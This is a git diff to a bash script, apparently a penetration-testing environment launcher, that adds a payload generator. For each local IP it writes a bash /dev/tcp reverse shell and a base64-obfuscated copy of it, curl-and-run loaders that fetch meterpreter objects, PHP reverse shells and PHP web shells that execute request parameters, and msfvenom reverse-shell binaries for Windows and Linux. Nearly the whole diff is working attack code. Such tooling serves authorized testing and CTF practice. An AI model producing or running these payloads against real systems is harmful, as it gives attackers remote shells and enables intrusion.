@@ -1,6 +1,7 @@
 #! /bin/bash
 # TODO : check if service already running
 # TODO : check if something is using the port
+# TODO : auto msfvenom binnaries
 
 echo "    ____             ______          ";
 echo "   / __ \___  ____  / ____/___ _   __";
@@ -10,15 +11,15 @@ echo "/_/    \___/_/ /_/_____/_/ /_/|___/  ";
 echo "                                     ";
 echo ""
 echo "Author : lLou_"
-echo "Suite version : V0.2.8"
-echo "Script version : V1.4"
+echo "Suite version : V0.3.0"
+echo "Script version : V1.5"
 echo ""
 echo ""
 
 restart-service () {
         if [[ $# -eq 0 ]];then return;fi
         for pid in $(ps aux | grep $1 | awk '{print($2)}'); do
-                kill $pid >/dev/null 2>/dev/null
+                sudo kill $pid >/dev/null 2>/dev/null
         done
 }
 
@@ -44,6 +45,11 @@ hotscript=/home/$usr/hot-script
 if [[ ! -d $hotscript ]];then
         echo "[+] Creating hotscript folder in $hotscript"
         mkdir $hotscript
+fi
+payloads_dir=$hotscript/payloads
+if [[ ! -d $payloads_dir ]];then
+        echo "[+] Creating payload folder in $hotscript"
+        mkdir $payloads_dir
 fi
 session=/home/$usr/.session
 if [[ ! -d $session ]];then
@@ -111,12 +117,54 @@ if [[ $vpnfile ]];then
   if [[ -f $vpnfile ]];then
     sudo unbuffer openvpn $vpnfile 2>&1 | tee $log/openvpn.log > /dev/null &
     sudo ln -s $log/openvpn.log $session/openvpn.stdout
+    tput setaf 4;echo "[*] Waiting a bit for tunnelling to set up";tput sgr0
+    while [[ ! "$(ifconfig | grep tun)" ]]; sleep .5; done
     tput setaf 4;echo "[*] Connexion to $(basename $vpnfile) done";tput sgr0
   else
-    tput setaf 1;echo "[!] Please give a valid file path";tput sgr0
+    tput setaf 1;echo "[!] $vpnfile is not a valid file path";tput sgr0
   fi
 fi
 
+## Dynamic hotscripts
+generating-payloads() {
+        ## $1 is ip, $2 is port (default is 4444) and $3 is directory (default is $payloads_dir/$ip-$port)
+        if [[ $# -eq 1 ]];then port=4444; dir=$payloads_dir/$1-$port
+        elif [[ $# -eq 2 ]];then port=$2; dir=$payloads_dir/$1-$port
+        elif [[ $# -eq 3 ]];then port=$2; dir=$3
+        else return; fi
+
+        if [[ ! -d "$dir" ]];then mkdir $dir; fi
+        if [[ ! -d "$dir/meterpreter" ]];then mkdir $dir/meterpreter; fi
+
+        # Linux reverse tcp
+        echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/$1/$port 0>&1'" > $dir/linux_reverse_tcp_bash
+        echo "echo '$(cat $dir/linux_reverse_tcp_bash | base64)' | base64 -d | /bin/bash" > $dir/linux_reverse_tcp_bash_b64
+        
+        # Linux ddexec sheller
+        echo "k=\$(curl -s http://$1/payloads/$1-$port/meterpreter/linux_x64.so | base64 -w0);/bin/bash /dev/stdin < <(echo "k=\$k" && (curl -s http://$1/ddexec | sed $'s/read -r bin/bin=\$k/g'))" > $dir/linux_ddexec_meterpreter_x64
+        echo "k=\$(curl -s http://$1/payloads/$1-$port/meterpreter/linux_x86.so | base64 -w0);/bin/bash /dev/stdin < <(echo "k=\$k" && (curl -s http://$1/ddexec | sed $'s/read -r bin/bin=\$k/g'))" > $dir/linux_ddexec_meterpreter_x86
+
+        # PHP web & reverse shell shell
+        echo "<?php system(\"$(cat $dir/linux_reverse_tcp_bash)\")?>" > $dir/linux_reverse_tcp_php
+        echo "<?php system(\"$(cat $dir/linux_reverse_tcp_bash_b64)\")?>" > $dir/linux_reverse_tcp_php_b64
+        echo "<?php system(\$_GET['cmd'])?>" > $dir/web_shell_php
+        echo "<html><body><form method=\"GET\" name=\"<?php echo basename(\$_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset(\$_GET[\"cmd\"])){system(\$_GET[\"cmd\"]);}?></pre></body></html>" > $dir/web_shell_comfort_php
+
+        # meterpreter
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$1 LPORT=$port -f exe > windows_x64.exe
+        msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$port -f exe > windows_x86.exe
+        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$port -f exe > linux_x64.exe
+        msfvenom -p linux/shell_reverse_tcp LHOST=$1 LPORT=$port -f exe > linux_x86.exe
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$1 LPORT=$port -f dll > windows_x64.dll
+        msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$port -f dll > windows_x86.dll
+        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$port -f elf-so > linux_x64.so
+        msfvenom -p linux/shell_reverse_tcp LHOST=$1 LPORT=$port -f elf-so > linux_x86.so
+
+}
+
+for ip in $(ifconfig | grep "inet " | awk '{print($2)}');do
+        generating-payloads $ip
+done
 
 
 ## File transfers
